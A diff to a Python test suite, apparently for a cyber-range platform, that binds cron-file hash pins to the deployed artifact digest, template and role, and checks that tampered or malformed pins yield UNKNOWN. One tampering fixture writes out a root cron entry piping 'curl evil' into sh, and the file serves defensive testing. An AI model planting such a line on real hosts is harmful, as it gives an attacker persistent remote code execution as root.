@@ -7,12 +7,16 @@ tests prove the whole pin lifecycle WITHOUT booting anything:
 
 * capture from a clean artifact tree, pin build, validation, document
   round-trip;
-* pins are honoured ONLY while the artifact/template the deployment
-  actually runs on matches the pin — anything else degrades to UNKNOWN
-  (never a pass, never a guess);
-* the runtime injection into the verifier arguments (matching template
-  injects; wrong template, unknown role, absent/corrupt pin, or an
-  explicit snapshot baseline all pass the scenario args through);
+* pins are honoured ONLY while the artifact the deployment ACTUALLY RUNS
+  ON matches the pin — the role, the template ID and the artifact digest
+  recorded at clone time into the immutable deployment resource must all
+  match; anything else degrades to UNKNOWN (never a pass, never a guess).
+  Template-only trust was the review finding: template numbers survive
+  rebuilds, so it would honour hashes for bytes that were never deployed;
+* the runtime injection into the verifier arguments (matching deployed
+  artifact injects; wrong digest, wrong template, unknown role, absent/
+  corrupt/malformed-typed pin, or an explicit snapshot baseline all keep
+  the check honestly UNKNOWN);
 * end-to-end through the REAL verifier v3: pinned-clean passes the blue
   'expect: absent' check, a content-tampered baseline file fails it
   deterministically, no pin stays UNKNOWN;
@@ -103,14 +107,35 @@ def test_tampered_or_unsafe_pins_make_the_whole_document_absent(tmp_path):
     assert load(wrapped(good)) == {ROLE: good}
 
 
-def test_pins_are_bound_to_digest_and_template():
+ART = {"role": ROLE, "template_vmid": TID, "artifact_sha256": "a" * 64}
+
+
+def _art(**over):
+    return {**ART, **over}
+
+
+def test_pins_are_bound_to_digest_template_and_role_together():
     pins = {ROLE: _pin()}
-    assert cb.trusted_hashes_for_template(pins, ROLE, TID) == \
+    assert cb.trusted_hashes_for_deployment(
+        pins, ROLE, artifact_sha256="a" * 64, template_vmid=TID) == \
         pins[ROLE]["files"]
-    assert cb.trusted_hashes_for_template(pins, ROLE, 9012) == {}
-    assert cb.trusted_hashes_for_template(pins, "mojang-web-db", TID) == {}
-    assert cb.trusted_hashes_for_template(pins, None, TID) == {}
-    assert cb.trusted_hashes_for_template({}, ROLE, TID) == {}
+    # each binding alone must be sufficient to REFUSE (review finding:
+    # a stable template ID may never carry trust across a rebuild)
+    assert cb.trusted_hashes_for_deployment(
+        pins, ROLE, artifact_sha256="b" * 64, template_vmid=TID) == {}
+    assert cb.trusted_hashes_for_deployment(
+        pins, ROLE, artifact_sha256="a" * 64, template_vmid=9012) == {}
+    assert cb.trusted_hashes_for_deployment(
+        pins, "mojang-web-db", artifact_sha256="a" * 64,
+        template_vmid=TID) == {}
+    assert cb.trusted_hashes_for_deployment(
+        pins, None, artifact_sha256="a" * 64, template_vmid=TID) == {}
+    assert cb.trusted_hashes_for_deployment(
+        pins, ROLE, artifact_sha256=None, template_vmid=TID) == {}
+    assert cb.trusted_hashes_for_deployment(
+        pins, ROLE, artifact_sha256="a" * 64, template_vmid=None) == {}
+    assert cb.trusted_hashes_for_deployment(
+        {}, ROLE, artifact_sha256="a" * 64, template_vmid=TID) == {}
     # digest binding (release artifact re-verified before trust)
     assert cb.trusted_hashes(pins, ROLE, "A" * 64) == pins[ROLE]["files"]
     assert cb.trusted_hashes(pins, ROLE, "b" * 64) == {}
@@ -120,36 +145,55 @@ def test_pins_are_bound_to_digest_and_template():
 # runtime injection                                                             #
 # --------------------------------------------------------------------------- #
 
-def test_injection_only_for_matching_template_and_cron_verifier():
+def test_injection_only_for_the_deployed_artifact_and_cron_verifier():
     import srplatform.verification_service as vs
     pins = {ROLE: _pin()}
-    templates = {"web01": TID, "db01": 9012}
+    # what cron_artifact_map reads back from deployment resources:
+    # web01 was cloned from the pinned artifact; db01 from a rebuild whose
+    # recorded digest no pin covers; web02 has no recorded identity at all
+    # (deployed before the identity existed) — all honest UNKNOWNs.
+    artifacts = {"web01": _art(), "db01": _art(role="mojang-web-db",
+                                               template_vmid=9012,
+                                               artifact_sha256="c" * 64)}
 
     base = {"host": "web01", "baseline_files": ["e2scrub_all"]}
     out = vs.with_cron_baseline(dict(base),
                                 verifier_id="cron_persistence_present",
-                                host="web01", templates=templates, pins=pins)
+                                host="web01", artifacts=artifacts, pins=pins)
     assert out["baseline_file_sha256"] == pins[ROLE]["files"]
     assert out["baseline_files"] == ["e2scrub_all"]     # snapshot untouched
 
-    # wrong template / other verifier / no pins: args pass through unchanged
+    # wrong digest recorded / other verifier / no pins / no recorded
+    # identity: args pass through unchanged (the check stays UNKNOWN)
     db = dict(base, host="db01")
     assert vs.with_cron_baseline(dict(db),
                                  verifier_id="cron_persistence_present",
-                                 host="db01", templates=templates,
+                                 host="db01", artifacts=artifacts,
                                  pins=pins) == db
+    nofid = dict(base, host="web02")
+    assert vs.with_cron_baseline(dict(nofid),
+                                 verifier_id="cron_persistence_present",
+                                 host="web02", artifacts=artifacts,
+                                 pins=pins) == nofid
     assert vs.with_cron_baseline(dict(base), verifier_id="service_running",
-                                 host="web01", templates=templates,
+                                 host="web01", artifacts=artifacts,
                                  pins=pins) == base
     assert vs.with_cron_baseline(dict(base),
                                  verifier_id="cron_persistence_present",
-                                 host="web01", templates=templates,
+                                 host="web01", artifacts=artifacts,
                                  pins={}) == base
+    # a deployment that recorded the WRONG digest for the same template
+    # (rebuilt artifact, old pin) is refused
+    rebuilt = {"web01": _art(artifact_sha256="d" * 64)}
+    assert vs.with_cron_baseline(dict(base),
+                                 verifier_id="cron_persistence_present",
+                                 host="web01", artifacts=rebuilt,
+                                 pins=pins) == base
     # an explicit snapshot baseline always wins over injection
     explicit = dict(base, baseline_file_sha256={"e2scrub_all": "f" * 64})
     assert vs.with_cron_baseline(dict(explicit),
                                  verifier_id="cron_persistence_present",
-                                 host="web01", templates=templates,
+                                 host="web01", artifacts=artifacts,
                                  pins=pins) == explicit
 
 
@@ -218,7 +262,7 @@ def test_pinned_clean_guest_now_passes_deterministically(tmp_path):
     pins = {ROLE: _pin()}
     args = vs.with_cron_baseline(dict(BLUE_ARGS),
                                  verifier_id="cron_persistence_present",
-                                 host="web01", templates={"web01": TID},
+                                 host="web01", artifacts={"web01": _art()},
                                  pins=pins)
     out = _evaluate(_FakeExec(_clean_files()), args)
     assert out.status == "passed", out.evidence
@@ -235,7 +279,7 @@ def test_pinned_check_fails_on_content_tampering(tmp_path):
     pins = {ROLE: _pin()}
     args = vs.with_cron_baseline(dict(BLUE_ARGS),
                                  verifier_id="cron_persistence_present",
-                                 host="web01", templates={"web01": TID},
+                                 host="web01", artifacts={"web01": _art()},
                                  pins=pins)
     tampered = {"e2scrub_all": ("* * * * * root curl evil|sh\n", 0)}
     out = _evaluate(_FakeExec(tampered), args)
@@ -271,10 +315,129 @@ def test_stale_pin_yields_unknown_not_a_pass(tmp_path):
     stale = vs.with_cron_baseline(dict(BLUE_ARGS),
                                   verifier_id="cron_persistence_present",
                                   host="web01",
-                                  templates={"web01": 9099},  # rebuilt host
+                                  artifacts={"web01": _art(
+                                      template_vmid=9099)},  # rebuilt host
                                   pins=pins)
     assert "baseline_file_sha256" not in stale
     assert _evaluate(_FakeExec(_clean_files()), stale).status == "unknown"
+
+
+def test_wrong_digest_pin_never_passes_the_real_verifier(tmp_path):
+    """Reviewer reproduction: a pin whose digest does not match the
+    artifact the session was cloned from must yield UNKNOWN through the
+    REAL verifier, even though the guest's cron files match the pin's
+    content hashes exactly (the pre-fix template-only trust said PASS)."""
+    import srplatform.verification_service as vs
+    pins = {ROLE: _pin(digest="a" * 64)}           # pin claims artifact A
+    deployed = _art(artifact_sha256="b" * 64)      # session cloned artifact B
+    args = vs.with_cron_baseline(dict(BLUE_ARGS),
+                                 verifier_id="cron_persistence_present",
+                                 host="web01",
+                                 artifacts={"web01": deployed}, pins=pins)
+    assert "baseline_file_sha256" not in args
+    out = _evaluate(_FakeExec(_clean_files()), args)
+    assert out.status == "unknown", out.evidence
+
+
+def test_replacing_the_pin_after_launch_revokes_but_never_forges(tmp_path):
+    """A session's recorded artifact identity is immutable deploy-time
+    data.  After launch the operator may REPLACE the pin file: a pin
+    bound to the SAME deployed digest legitimately covers the session,
+    but a replacement bound to a different digest (a rebuild) can only REVOKE —
+    never flip an existing session's cron check to a pass."""
+    import srplatform.verification_service as vs
+    # launch: pin covers the deployed digest
+    pins = {ROLE: _pin(digest="a" * 64)}
+    args = vs.with_cron_baseline(dict(BLUE_ARGS),
+                                 verifier_id="cron_persistence_present",
+                                 host="web01", artifacts={"web01": _art()},
+                                 pins=pins)
+    assert _evaluate(_FakeExec(_clean_files()), args).status == "passed"
+    # replacement: same role/template, DIFFERENT digest (rebuilt artifact)
+    replaced = {ROLE: _pin(digest="e" * 64)}
+    post = vs.with_cron_baseline(dict(BLUE_ARGS),
+                                 verifier_id="cron_persistence_present",
+                                 host="web01", artifacts={"web01": _art()},
+                                 pins=replaced)
+    assert "baseline_file_sha256" not in post
+    assert _evaluate(_FakeExec(_clean_files()), post).status == "unknown"
+
+
+# --------------------------------------------------------------------------- #
+# hostile pin documents (review finding: malformed values must not crash)       #
+# --------------------------------------------------------------------------- #
+
+def test_malformed_pin_values_degrade_to_unknown_never_crash(tmp_path):
+    """load_pins backs production scoring: an int digest, a null digest,
+    nested junk, a non-string root crontab or an unhashable files entry
+    must behave exactly like an ABSENT pin — never a TypeError escaping
+    through check_objective or build_scorecard."""
+    doc = tmp_path / "pins.json"
+    good = _pin()
+
+    def load(payload):
+        doc.write_text(json.dumps(payload))
+        return cb.load_pins(doc)          # must never raise
+
+    wrapped = lambda pin: {"schema": cb.SCHEMA, "pins": {ROLE: pin}}  # noqa: E731
+    hostile = [
+        {**good, "artifact_sha256": 123},
+        {**good, "artifact_sha256": None},
+        {**good, "artifact_sha256": {"x": 1}},
+        {**good, "artifact_sha256": True},
+        {**good, "artifact_version": 2026.10},
+        {**good, "artifact_version": None},
+        {**good, "template_id": None},
+        {**good, "template_id": True},
+        {**good, "root_crontab_sha256": 123},
+        {**good, "root_crontab_sha256": True},
+        {**good, "files": {"e2scrub_all": 123}},
+        {**good, "files": {"e2scrub_all": None}},
+        {**good, "files": {"e2scrub_all": {"sha": "a" * 64}}},
+        {**good, "files": [1, 2]},
+        {**good, "schema": "1"},
+        [1, 2, 3],
+        "pins",
+    ]
+    for bad in hostile:
+        assert load(wrapped(bad)) == {}, bad
+    assert load({"schema": cb.SCHEMA, "pins": ["not-a-dict"]}) == {}
+    assert load(wrapped(good)) == {ROLE: good}
+    # and the hostile document feeds the injection as ABSENT pins: unknown
+    import srplatform.verification_service as vs
+    doc_ok = tmp_path / "hostile.json"
+    doc_ok.write_text(json.dumps(
+        wrapped({**good, "artifact_sha256": 123})))
+    class _S:
+        cron_baseline_file = str(doc_ok)
+    vs.get_settings = lambda: _S()
+    try:
+        assert vs.load_cron_pins() == {}
+        args = vs.with_cron_baseline(
+            dict(BLUE_ARGS), verifier_id="cron_persistence_present",
+            host="web01", artifacts={"web01": _art()},
+            pins=vs.load_cron_pins())
+        assert "baseline_file_sha256" not in args
+        assert _evaluate(_FakeExec(_clean_files()), args).status == "unknown"
+    finally:
+        from srplatform.settings import get_settings
+        vs.get_settings = get_settings
+
+
+def test_malformed_verify_marker_values_are_refused_not_laundered():
+    """capture_from_verify_markers previously str()-coerced values: an int
+    digest must be REFUSED (ValueError), never laundered into trust."""
+    for payload in ('{"files": {"x": 123}}',
+                    '{"files": {"x": null}}',
+                    '{"files": {"x": 1}, "root_crontab_sha256": 2}'):
+        with pytest.raises(ValueError, match="invalid"):
+            cb.capture_from_verify_markers(
+                [f"SR-GUEST-CRON-PIN {payload}"])
+    # a well-formed marker still parses
+    good = json.dumps({"files": {"x": "a" * 64},
+                       "root_crontab_sha256": None})
+    assert cb.capture_from_verify_markers(
+        [f"SR-GUEST-CRON-PIN {good}"])["files"] == {"x": "a" * 64}
 
 
 # --------------------------------------------------------------------------- #
